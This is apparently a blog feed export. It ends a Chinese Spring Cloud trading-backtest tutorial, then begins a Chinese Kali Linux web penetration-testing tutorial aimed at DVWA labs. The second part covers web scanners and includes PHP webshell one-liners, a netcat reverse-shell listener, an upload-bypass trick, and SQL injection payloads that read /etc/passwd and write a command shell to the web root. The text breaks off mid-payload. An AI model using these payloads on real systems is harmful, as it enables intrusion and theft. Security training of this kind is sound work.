class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8088</span> <span class="comment">#Sentinel dashboard地址</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span> <span class="comment">#默认8719</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">trend-trading-backtest-service</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#开启feign模式的断路器</span></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="将回测添加入网关"><a href="#将回测添加入网关" class="headerlink" title="将回测添加入网关"></a>将回测添加入网关</h4><h2 id="模拟回测视图"><a href="#模拟回测视图" class="headerlink" title="模拟回测视图"></a>模拟回测视图</h2><p>视图：<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDMxL2FwaS12aWV3Lw==">http://127.0.0.1:8031/api-view/<i class="fa fa-external-link-alt"></i></span></p><h2 id="趋势投资收益"><a href="#趋势投资收益" class="headerlink" title="趋势投资收益"></a>趋势投资收益</h2><p>接下来，我们就要在当前指数数据的基础上做趋势投资的模拟回测了。<br>趋势投资为什么能盈利，我们在 <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3RyZW5kL3RyZW5kLTIwNzgvMjA3OC5odG1s">趋势投资<i class="fa fa-external-link-alt"></i></span> 里分析过了，如图所示，它其实就是砍掉了左边重大损失不部分，保留了右侧重大收益部分，所以盈利了。 为了做到这一点，我们需要建立两个概念： MA 均线，和出售阈值。<br><strong>MA 均线</strong>：MA 即 moving average, 移动均线的意思。 比如MA20就表示20日均线，取最近20天的值的平均数。 如果当前的收盘点高于这个均线一定的比例，那么我们认为上涨的趋势<strong>可能</strong>就来了，就可以买了。<br><strong>出售阈值</strong>：如果当前的收盘点，比起最近的20个交易日里的最高的点，跌了 5%或者 10%了，那么我们认为下跌趋势<strong>可能</strong>就来了，就可以卖了。</p><p>采用这种思路，就可以增加获取右边高收益的几率，降低左边吃大亏的几率。 随着次数的累计，总收益就会不错啦。</p><blockquote><p>ma—–均线日期</p><p>sellRate—出售阈值，按百分比计算。</p><p>buyRate—购买阈值</p><p>serviceCharge—服务费用</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title">simulate</span><span class="params">(<span class="keyword">int</span> ma, <span class="keyword">float</span> sellRate, <span class="keyword">float</span> buyRate, <span class="keyword">float</span> serviceCharge, List&lt;IndexData&gt; indexDatas)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    List&lt;Profit&gt; profits =<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">float</span> initCash = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">float</span> cash = initCash;</span><br><span class="line">    <span class="keyword">float</span> share = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> init =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!indexDatas.isEmpty()) &#123;</span><br><span class="line">        init = indexDatas.get(<span class="number">0</span>).getClosePoint();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;indexDatas.size() ; i++) &#123;</span><br><span class="line">        IndexData indexData = indexDatas.get(i);</span><br><span class="line">        <span class="keyword">float</span> closePoint = indexData.getClosePoint();</span><br><span class="line">        <span class="keyword">float</span> avg = getMA(i,ma,indexDatas);</span><br><span class="line">        <span class="keyword">float</span> max = getMax(i,ma,indexDatas);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">float</span> increase_rate = closePoint/avg;</span><br><span class="line">        <span class="keyword">float</span> decrease_rate = closePoint/max;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(avg!=<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//buy 超过了均线</span></span><br><span class="line">            <span class="keyword">if</span>(increase_rate&gt;buyRate  ) &#123;</span><br><span class="line">                <span class="comment">//如果没买</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span> == share) &#123;</span><br><span class="line">                    share = cash / closePoint;</span><br><span class="line">                    cash = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//sell 低于了卖点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(decrease_rate&lt;sellRate ) &#123;</span><br><span class="line">                <span class="comment">//如果没卖</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span>!= share)&#123;</span><br><span class="line">                    cash = closePoint * share * (<span class="number">1</span>-serviceCharge);</span><br><span class="line">                    share = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//do nothing</span></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(share!=<span class="number">0</span>) &#123;</span><br><span class="line">            value = closePoint * share;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            value = cash;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">float</span> rate = value/initCash;</span><br><span class="line"></span><br><span class="line">        Profit profit = <span class="keyword">new</span> Profit();</span><br><span class="line">        profit.setDate(indexData.getDate());</span><br><span class="line">        profit.setValue(rate*init);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"profit.value:"</span> + profit.getValue());</span><br><span class="line">        profits.add(profit);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">"profits"</span>, profits);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">float</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> day, List&lt;IndexData&gt; list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = i-<span class="number">1</span>-day;</span><br><span class="line">    <span class="keyword">if</span>(start&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        start = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> now = i-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(start&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = start; j &lt; now; j++) &#123;</span><br><span class="line">        IndexData bean =list.get(j);</span><br><span class="line">        <span class="keyword">if</span>(bean.getClosePoint()&gt;max) &#123;</span><br><span class="line">            max = bean.getClosePoint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">float</span> <span class="title">getMA</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> ma, List&lt;IndexData&gt; list)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = i-<span class="number">1</span>-ma;</span><br><span class="line">    <span class="keyword">int</span> now = i-<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(start&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">float</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> avg = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = start; j &lt; now; j++) &#123;</span><br><span class="line">        IndexData bean =list.get(j);</span><br><span class="line">        sum += bean.getClosePoint();</span><br><span class="line">    &#125;</span><br><span class="line">    avg = sum / (now - start);</span><br><span class="line">    <span class="keyword">return</span> avg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="链路追踪"><a href="#链路追踪" class="headerlink" title="链路追踪"></a>链路追踪</h2><p>Spring Cloud Sleuth是对Zipkin的一个封装，对于Span、Trace等信息的生成、接入HTTP Request，以及向Zipkin Server发送采集信息等全部自动完成。这是Spring Cloud Sleuth的概念图</p><p>所以只需要引入zipkin的依赖就可以</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--zipkin--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zipkin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>之后在yml添加相应配置即可开启链路追踪，使用zipkin的server控制台可以查看链路</p><h2 id="配置服务器"><a href="#配置服务器" class="headerlink" title="配置服务器"></a>配置服务器</h2><p>这里使用nacos作为配置服务器</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>项目架构图</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200806165223390.png" alt="image-20200806165223390"></p><blockquote><p>技术栈</p></blockquote><p>为了完成这个项目，都用到了以下的技术</p><ol><li>Java<br><span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9zdGFnZS8xMi5odG1s">Java基础<i class="fa fa-external-link-alt"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9zdGFnZS8yNS5odG1s">Java中级<i class="fa fa-external-link-alt"></i></span> 的大部分内容</li><li>前端<br><span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2h0bWwvaHRtbC10dXRvcmlhbC8xNzUuaHRtbA==">html<i class="fa fa-external-link-alt"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2NzczIvY3NzMi10dXRvcmlhbC8yMzguaHRtbA==">CSS<i class="fa fa-external-link-alt"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2phdmFzY3JpcHQvamF2YXNjcmlwdC1qYXZhc2NyaXB0LXR1dG9yaWFsLzUxOS5odG1s">Javascript<i class="fa fa-external-link-alt"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2pzb24vanNvbi10dXRvcmlhbC81MzEuaHRtbA==">JSON<i class="fa fa-external-link-alt"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2FqYXgvYWpheC10dXRvcmlhbC80NjUuaHRtbA==">AJAX<i class="fa fa-external-link-alt"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2pxdWVyeS9qcXVlcnktdHV0b3JpYWwvNDY3Lmh0bWw=">JQuery <i class="fa fa-external-link-alt"></i></span>,<span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2Jvb3N0cmFwL2Jvb3N0cmFwLXR1dG9yaWFsLzUzOC5odG1s">Bootstrap<i class="fa fa-external-link-alt"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3Z1ZWpzL3Z1ZWpzLXN0YXJ0LzE3NDQuaHRtbA==">Vue.js <i class="fa fa-external-link-alt"></i></span>，<span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2NoYXJ0anMvY2hhcnRqcy1pbnRyby8yMDU2Lmh0bWw=">chartjs<i class="fa fa-external-link-alt"></i></span></li><li>框架部分<br><span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3NwcmluZy9zcHJpbmctaW9jLWRpLzg3Lmh0bWw=">spring<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3NwcmluZ212Yy9zcHJpbmdtdmMtc3ByaW5nbXZjLzYxNS5odG1s">springmvc<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3NwcmluZ2Jvb3Qvc3ByaW5nYm9vdC1lY2xpcHNlLzE2NDAuaHRtbA==">springboot<i class="fa fa-external-link-alt"></i></span> <code>SpringCloudAlibaba</code>(<code>nacos</code>、<code>sentinel</code>、<code>feign</code>、<code>zipkin</code>)</li><li>中间件<br><span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3JlZGlzL3JlZGlzLWRvd25sb2FkLWluc3RhbGwvMTM2Ny5odG1s">redis<i class="fa fa-external-link-alt"></i></span></li><li>开发工具<br><span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL2lkZWEvaWRlYS1kb3dubG9hZC1pbnN0YWxsLzEzNDguaHRtbA==">Intellij IDEA<i class="fa fa-external-link-alt"></i></span>,<span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL21hdmVuL21hdmVuLWludHJvZHVjdGlvbi8xMzI4Lmh0bWw=">Maven<i class="fa fa-external-link-alt"></i></span></li><li>分布式<br><span class="exturl" data-url="aHR0cHM6Ly9ob3cyai5jbi9rL3NwcmluZ2Nsb3VkL3NwcmluZ2Nsb3VkLWludHJvLzIwMzUuaHRtbA==">SpringCloud<i class="fa fa-external-link-alt"></i></span></li></ol>]]></content>
      <categories>
        <category>Spring框架</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali使用教程（三）：Web渗透</title>
    <url>/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><blockquote><p>明文：<br>无内建的机密性安全机制<br>嗅探或代理截断可查看全部明文信息<br>https只能提高传输层安全<br>无状态：<br>每一次客户端和服务器端的通信都是独立的过程<br>WEB应用需要跟踪客户端会话(多步通信)<br>不使用cookie的应用，客户端每次请求都要重新身份验证(不现实)<br>Session用于在用户身份验证后跟踪用户行为轨迹：<br>提高用户体验，但增加了攻击向量</p></blockquote><a id="more"></a><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Cycle</span>:</span><br><span class="line">	请求/响应</span><br><span class="line">重要的<span class="attribute">header</span>:</span><br><span class="line">    <span class="attribute">Set-Cookie</span>:服务器发给客户端的SessionID ( 被窃取的风险)</span><br><span class="line">    <span class="attribute">Content-Length</span>:响应body部分的字节长度</span><br><span class="line">    <span class="attribute">Location</span>:重定向用户到另一个页面，可识别身份认证后允许访问的页面</span><br><span class="line">    <span class="attribute">Cookie</span>:客户端发回给服务器证明用户状态的信息(头:值成对出现)</span><br><span class="line">    <span class="attribute">Referrer</span>:发起新请求之前用户位于哪个页面，服务器基于此头的安全限制很容</span><br><span class="line">    易被修改绕过</span><br></pre></td></tr></table></figure><h4 id="HTTP协议状态码"><a href="#HTTP协议状态码" class="headerlink" title="HTTP协议状态码"></a>HTTP协议状态码</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">服务端响应的状态码表示响应的结果类型(<span class="number">5</span>大类<span class="number">50</span>多 个具体响应码)</span><br><span class="line"><span class="number">100</span>s:服务器响应的信息，通常表示服务器还有后续处理，很少出现</span><br><span class="line"><span class="number">200</span>s:请求被服务器成功接受并处理后返回的响应结果</span><br><span class="line"><span class="number">300</span>s:重定向，通常在身份认证成功后重定向到一个安全页面(<span class="number">301</span>/<span class="number">302</span>)</span><br><span class="line"><span class="number">400</span>s:表示客户端请求错误</span><br><span class="line">	<span class="number">401</span>:需要身份验证</span><br><span class="line">	<span class="number">403</span>:拒绝访问</span><br><span class="line">	<span class="number">404</span>:目标未发现</span><br><span class="line"><span class="number">500</span>s:服务器内部错误(<span class="number">503</span>: 服务不可用)</span><br><span class="line">http:<span class="comment">//www.w3.org/Protocols/rfc26 1 6/rfc2616 sec 10.html</span></span><br></pre></td></tr></table></figure><hr><h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><h4 id="Httrack"><a href="#Httrack" class="headerlink" title="Httrack"></a>Httrack</h4><blockquote><p>使用Httrack去下载目标网站资源，减少与目标系统的交互</p></blockquote><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="NIKTO"><a href="#NIKTO" class="headerlink" title="NIKTO"></a>NIKTO</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Perl语言开发的开源web安全扫描器</span><br><span class="line">软件版本</span><br><span class="line">搜索存在安全隐患的文件</span><br><span class="line">服务器配置漏洞</span><br><span class="line">插件: nikto -list-plugins</span><br><span class="line">nikto -update</span><br><span class="line">	cirt.net</span><br><span class="line">nikto -host http://1.1.1.1</span><br><span class="line">nikto -host 192.168.1.1 -ssl -port 443</span><br><span class="line">-vhost</span><br><span class="line"></span><br><span class="line">Space - report current scan status</span><br><span class="line">v - verbose mode on/off #可视化扫描</span><br><span class="line">d - debug mode on/off</span><br><span class="line">e - error reporting on/off</span><br><span class="line">p - progress reporting on/off</span><br><span class="line">r- redirect display on/off</span><br><span class="line">C - cookie display on/off</span><br><span class="line">a - auth display on/off</span><br><span class="line">q - quit</span><br><span class="line">N - next host</span><br><span class="line">P - Pause</span><br></pre></td></tr></table></figure><h4 id="vega"><a href="#vega" class="headerlink" title="vega"></a>vega</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">JAVA编写的开源Web扫描器：</span><br><span class="line">    扫描模式</span><br><span class="line">    代理模式</span><br><span class="line">    爬站、处理表单、注入测试</span><br><span class="line">    支持<span class="string">SSL :</span> <span class="string">http:</span><span class="comment">//vega/ca.crt</span></span><br></pre></td></tr></table></figure><h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C语言编写</span><br><span class="line">实验性的主动web安全评估工具</span><br><span class="line">递归爬网</span><br><span class="line">基于字典的探测</span><br><span class="line">速度较快</span><br><span class="line">	多路单线程，全异步网络I/O,消除内存管理和调度开销</span><br><span class="line">	启发式自动内容识别</span><br><span class="line">误报较低</span><br><span class="line"></span><br><span class="line">skipfish -0 test http://1.1.1.1 </span><br><span class="line">skipfish -0 test @url.txt</span><br><span class="line">skipfish -0 test -S complet.wl -W a.wl http://1.1.1.1 	#字典</span><br><span class="line">-I :只检查包含string的URL</span><br><span class="line">-X :不检查包含string的URL  #logout</span><br><span class="line">-K :不对指定参数进行Fuzz测试</span><br><span class="line"><span class="meta">	#</span><span class="bash">Fuzz测试，也叫做“模糊测试”，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试，它通过向软件输入非法的字段，观测被测试软件是否异常而实现。</span></span><br><span class="line">-D :跨站点爬另外一个域 #即扫描指定域名会跳转的域</span><br><span class="line">-l :每秒最大请求数</span><br><span class="line">-m :每IP最大并发连接数</span><br><span class="line">--config :指定配置文件</span><br><span class="line">身份认证:</span><br><span class="line">	skipfish -A user:pass -0 test http://1.1.1.1 #以表单方式</span><br><span class="line">	skipfish -C "name=val" -0 test http://1.1.1.1 #以cookie方式</span><br><span class="line">示例：</span><br><span class="line">sudo skipfish -o test1 -I /dvwa/  http://192.168.2.105/dvwa</span><br></pre></td></tr></table></figure><blockquote><p>尝试扫描dvwa靶场，结果如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616201151479.png" alt="image-20200616201151479"></p><h4 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Web Application Attack and Audit Framework,基于python语言开发</span><br><span class="line">此框架的目标是帮助你发现和利用所有WEB应用程序漏洞</span><br><span class="line">9大类近150个plugin</span><br><span class="line">    audit(常用)</span><br><span class="line">    infrastructure</span><br><span class="line">    grep</span><br><span class="line">    evasion</span><br><span class="line">    mangle</span><br><span class="line">    auth</span><br><span class="line">    bruteforce</span><br><span class="line">    output</span><br><span class="line">    crawl(常用)</span><br><span class="line">安装:</span><br><span class="line">	cd ~</span><br><span class="line">    apt-get update</span><br><span class="line">    apt-get install -y python-pip w3af</span><br><span class="line">    pip install -upgrade pip</span><br><span class="line">    git clone https://github.com/andresriancho/w3af.git</span><br><span class="line">    cd w3af</span><br><span class="line">    ./w3af_console ( ./w3af_ gui)</span><br><span class="line">    apt-get build-dep python-lxml</span><br><span class="line">    ./tmp/w3af_ dependency_ install.sh</span><br></pre></td></tr></table></figure><h4 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a>Arachni</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Kall自带了旧的arachni阉割版</span><br><span class="line">安装</span><br><span class="line">	http://www.arachni-scanner.com/download/Linux</span><br><span class="line">	tar xvf arachni.tar.gz</span><br><span class="line">    http://localhost:9292/</span><br><span class="line">    admin@admin.admin / administrator</span><br></pre></td></tr></table></figure><ul><li><p>Profile</p><ul><li>Import</li><li>Export</li><li>New</li></ul></li><li><p>Dispatcher（使用RPC服务进行分布式扫描）</p><ul><li>./arachni_ rpcd –address=127.0.0.1 –port=1111 –nickname=test1</li></ul></li><li><p>Grid（加入组，实现负载均衡）</p><ul><li>./arachni_ rpcd - nickname=test2 –address=127.0.0.1 -neighbour=127.0.0.1:1111</li></ul></li><li><p>Scan</p></li></ul><h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h4><blockquote><p>强大的主动扫描工具</p></blockquote><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">在新版本kali中已经没有集成该工具，需要自行到官网下载</span><br><span class="line">WEB Application集成渗透测试和漏洞挖掘工具</span><br><span class="line">开源免费跨平台简单易用</span><br><span class="line">截断代理</span><br><span class="line">主动、被动扫描</span><br><span class="line">Fuzzy、暴力破解</span><br><span class="line">API</span><br><span class="line">	- <span class="string">http:</span><span class="comment">//zap/</span></span><br></pre></td></tr></table></figure><blockquote><p>阶段代理：首先在firefox浏览器配置OWASP的代理：ip+端口</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617163535961.png" alt="image-20200617163535961"></p><blockquote><p>扫描dvwa</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617170103014.png" alt="image-20200617170103014"></p><h4 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Web安全工具中的瑞士军刀</span><br><span class="line">统一的集成工具发现全部现代WEB安全漏洞</span><br><span class="line">PortSwigger公司开发</span><br><span class="line">    Burp Free</span><br><span class="line">    Burp Professional</span><br><span class="line">    http://www .portswigger.net</span><br><span class="line">所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交</span><br><span class="line">换信息。</span><br><span class="line">Proxy：</span><br><span class="line">	Options</span><br><span class="line">	Invisible (主机头/多目标域名)</span><br><span class="line"><span class="meta">		#</span><span class="bash">即非浏览器客户端，不支持http代理时使用</span></span><br><span class="line">	CA (导入/导出)</span><br><span class="line">	Intercept (入站 /出站)</span><br><span class="line">	Response modify</span><br><span class="line">Target： #这里主要显示目标站点结构</span><br><span class="line">	Scope (logout)</span><br><span class="line">	Filter</span><br><span class="line">	Comparing site map</span><br><span class="line">Intruder: #侵入，使用各类字典、正则、生成器来匹配登录账号或密码</span><br><span class="line">	Position：#进行匹配替换的请求头</span><br><span class="line">	Payloads：#填充数据的方式</span><br><span class="line"><span class="meta">	#</span><span class="bash">可以从Target入口找到目标站点，右键send到Intruder</span></span><br><span class="line">Repeater：#对指定页面进行request和查看response。同样可以通过send进入</span><br><span class="line">    Request History</span><br><span class="line">    Change request method</span><br><span class="line">    Change body encoding</span><br><span class="line">    Copy as curl command</span><br><span class="line">    Convert selection</span><br><span class="line">    Repeater菜单</span><br><span class="line">        Engagement tools--generate csrf PoC</span><br><span class="line">        Follow redirections</span><br><span class="line">        Process cookies in redirections</span><br><span class="line">Sequencer: #分析cookie的随机性，含各种指标</span><br><span class="line">	分析程序中可预测的数据</span><br><span class="line">	Session cookies</span><br><span class="line">	anti-CSRF tokens</span><br><span class="line">	Start live capture</span><br><span class="line">		Analyze (数据越多分析越准确)</span><br><span class="line">		伪随机数算法</span><br><span class="line">		Character-level</span><br><span class="line">		Bit-level</span><br><span class="line">	FIPS-美国联邦信息 处理标准(Federal Information Processingstandard)</span><br></pre></td></tr></table></figure><hr><h3 id="手动漏洞挖掘"><a href="#手动漏洞挖掘" class="headerlink" title="手动漏洞挖掘"></a>手动漏洞挖掘</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PHP反弹shell：</span><br><span class="line">	/us/share/webshells/php/php-reverse-shell.php #kali自带的反弹木马</span><br><span class="line">	nc -lvp 4444 #监听弹回的shell</span><br><span class="line">File：</span><br><span class="line">	Whereis</span><br><span class="line">		lfconfig</span><br><span class="line">写入webshell</span><br><span class="line">	echo "&lt;?php \$cmd= \$_ GET["'cmd";system(\$cmd);?&gt;" &gt;</span><br><span class="line">	/var/www/3.php	</span><br><span class="line"><span class="meta">#</span><span class="bash">关于一句话反弹shell可以参考：https://zhuanlan.zhihu.com/p/30170345</span></span><br></pre></td></tr></table></figure><h4 id="会话sessionID"><a href="#会话sessionID" class="headerlink" title="会话sessionID"></a>会话sessionID</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Xss / cookie importer</span><br><span class="line">    SessionID in URL</span><br><span class="line">    嗅探</span><br><span class="line">    SessionID长期不变/永久不变</span><br><span class="line">    SessionID生成算法：</span><br><span class="line">        Sequencer</span><br><span class="line">        私有算法</span><br><span class="line">        预判下- -次登陆时生成的SessionID</span><br><span class="line">        登出后返回测试</span><br><span class="line">        salt #加盐</span><br></pre></td></tr></table></figure><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php echo shell_exec($_ GET['cmd']);?&gt;</span><br><span class="line">    直接上传webshell</span><br><span class="line">    修改文件类型上传webshell</span><br><span class="line">        Mimetype-文件头、 扩展名 </span><br><span class="line">        # 使用burpsuite阶段代理，然后强制修改请求头（能过medium）</span><br><span class="line">        # Mimetype会根据文件前10个字节判断文件类型，所以有时候修改后缀是无效的</span><br><span class="line">        # 对于high级别，可以修改文件名为xx.php.jpg。可以绕过文件后缀检测</span><br><span class="line">        # 一些严格检测会检测文件字节数据，判断文件类型。需要直接修改文件内容上传</span><br><span class="line">        # 一般会对上传文件目录设置只读权限</span><br></pre></td></tr></table></figure><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏	览器</span><br><span class="line">用户登录判断：</span><br><span class="line">    SELECT * FROM users WHERE user= 'uname' AND password= ' pass'</span><br><span class="line">    SELECT * FROM users WHERE user=‘name' AND password=" OR "='</span><br><span class="line">基于报错的检测方法(low)</span><br><span class="line">    '"%( )</span><br><span class="line">基于布尔的检测</span><br><span class="line">    1' and '1'='1    /    1' and '1</span><br><span class="line">    1' and‘1'='2     /    1' and‘0</span><br><span class="line">表列数/显示信息位于哪一列</span><br><span class="line">	'order by 9--     #按查询列号排序(注释符: -- )</span><br><span class="line">	select *时表字段数=查询字段数</span><br><span class="line">联合查询</span><br><span class="line">    ' union select 1,2--</span><br><span class="line">    ' union all select database(),2--</span><br><span class="line">读取文件</span><br><span class="line">	' union SELECT null, load_ file('/etc/passwd)--+</span><br><span class="line">写入文件</span><br><span class="line">	' union select null,"&lt;?php passthru($_ GET['cmd]); ?&gt;" INTO DUMPFILE</span><br><span class="line">	"/var/www/a.php" -+</span><br><span class="line">Mysql账号</span><br><span class="line">	cat php-revers-shell.php | xxd -PS | tr-d ^\n'</span><br><span class="line">	' union select null, 